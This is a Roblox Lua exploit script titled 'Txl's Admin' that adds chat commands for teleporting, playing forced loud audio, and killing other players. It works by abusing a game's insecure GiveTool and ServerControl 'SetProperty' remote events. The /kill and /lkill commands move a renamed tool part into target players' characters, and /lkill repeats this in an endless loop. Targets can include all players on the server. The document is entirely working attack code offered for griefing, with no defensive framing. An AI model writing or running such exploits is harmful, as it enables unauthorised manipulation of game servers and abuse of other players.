game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Txl's Admin loaded!", "All")
wait(.5)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Prefix is /.", "All")
a=8550867
prefix = "/"
lplayer = game.Players.LocalPlayer
game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)

function GetPlayer(String)
    local Found = {}
    local strl = String:lower()
    if strl == "all" then
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name ~= lplayer.Name then
                table.insert(Found,v)
            end
        end   
    elseif strl == "me" then
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name == lplayer.Name then
                table.insert(Found,v)
            end
        end  
    else
        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name:lower():sub(1, #String) == String:lower() then
                table.insert(Found,v)
            end
        end    
    end
    return Found    
end
if string.sub(msg,1,6)==prefix.."goto " then
for i, v in pairs(GetPlayer(string.sub(msg, 7))) do
game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame    
end
end;

if string.sub(msg,1,7)==prefix.."lkill "then 
for f,g in pairs(GetPlayer(string.sub(msg,8)))do 
local C=game:GetService('Players').LocalPlayer.Name
local D={}
local E={workspace=game:GetService("Workspace"),players=game:GetService("Players")}
local F,G=E.players.LocalPlayer,E.workspace:FindFirstChild(C)
function D:FireEvent(H,I,J,K)G:FindFirstChild(H)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=K,["Property"]=J,["Object"]=I})end
_G.lkill=true
while _G.lkill do 
game.Workspace.GiveTool:FireServer(a,"PompousTheCloud")F["Backpack"]:WaitForChild("PompousTheCloud").Parent=G
D:FireEvent("PompousTheCloud",G.PompousTheCloud.Handle,"Name","Head")
D:FireEvent("PompousTheCloud",G.PompousTheCloud.Head.Mesh,"MeshId","0")
D:FireEvent("PompousTheCloud",G.PompousTheCloud.Head,"Parent",game.Players[g.Name].Character)
game.Players.LocalPlayer.Character.PompousTheCloud:Remove()wait(0)
end 
end 
end;

if string.sub(msg,1,8)==prefix.."wmusic "then 
local C=game:GetService('Players').LocalPlayer.Name;
local D={}
local E={workspace=game:GetService("Workspace"),players=game:GetService("Players")}
local F,G=E.players.LocalPlayer,E.workspace:FindFirstChild(C)
function D:FireEvent(H,I,J,K)
G:FindFirstChild(H)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=K,["Property"]=J,["Object"]=I})
end;
E.workspace.Buy:FireServer(0,"PompousTheCloud")
F["Backpack"]:WaitForChild("PompousTheCloud").Parent=G;
if not game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoomBox")then 
game.Workspace.GiveTool:FireServer(a,"SuperFlyGoldBoombox")
E.players.LocalPlayer.Backpack:WaitForChild("SuperFlyGoldBoombox").Parent=E.players.LocalPlayer.Character;
local X=E.players.LocalPlayer.Character:WaitForChild("SuperFlyGoldBoombox").Handle.BoomboxSound;
local Y=X.Parent.Parent.Remote;
Y:FireServer("PlaySong",string.sub(msg,9))
wait(1)
D:FireEvent("PompousTheCloud",G["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"],"Parent",E.players.LocalPlayer.Character)
D:FireEvent("PompousTheCloud",G["SuperFlyGoldBoombox"],"Parent",E.players.LocalPlayer.Backpack)
D:FireEvent("PompousTheCloud",G["BoomboxSound"],"Name","NOOB")
D:FireEvent("PompousTheCloud",G["NOOB"],"Playing",false)
D:FireEvent("PompousTheCloud",G["NOOB"],"Volume",10)
D:FireEvent("PompousTheCloud",G["NOOB"],"PlayBackLoudness",5)
D:FireEvent("PompousTheCloud",G["NOOB"],"Looped",false)
D:FireEvent("PompousTheCloud",G["NOOB"],"Playing",true)
E.players.LocalPlayer.Backpack:WaitForChild("SuperFlyGoldBoombox"):Destroy()
game.Players.LocalPlayer.Character.PompousTheCloud:Remove()
end 
end;

if string.sub(msg,1,6)==prefix.."kill "then
game.workspace.GiveTool:FireServer("8550867", "PompousTheCloud") 
for f,g in pairs(GetPlayer(string.sub(msg,7)))do 
local C=game:GetService('Players').LocalPlayer.Name;
local D={}
local E={workspace=game:GetService("Workspace"),players=game:GetService("Players")}
local F,G=E.players.LocalPlayer,E.workspace:FindFirstChild(C)
function D:FireEvent(H,I,J,K)
G:FindFirstChild(H)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=K,["Property"]=J,["Object"]=I})
end;
game.Workspace.GiveTool:FireServer(8550867, "PompousTheCloud")
F["Backpack"]:WaitForChild("PompousTheCloud").Parent=G;
D:FireEvent("PompousTheCloud",G.PompousTheCloud.Handle,"Name","Head")
D:FireEvent("PompousTheCloud",G.PompousTheCloud.Head.Mesh,"MeshId","0")
D:FireEvent("PompousTheCloud",G.PompousTheCloud.Head,"Parent",game.Players[g.Name].Character)
game.Players.LocalPlayer.Character.PompousTheCloud:Remove()
game.Workspace.GiveTool:FireServer(8550867, "PompousTheCloud")
end 
end
end)
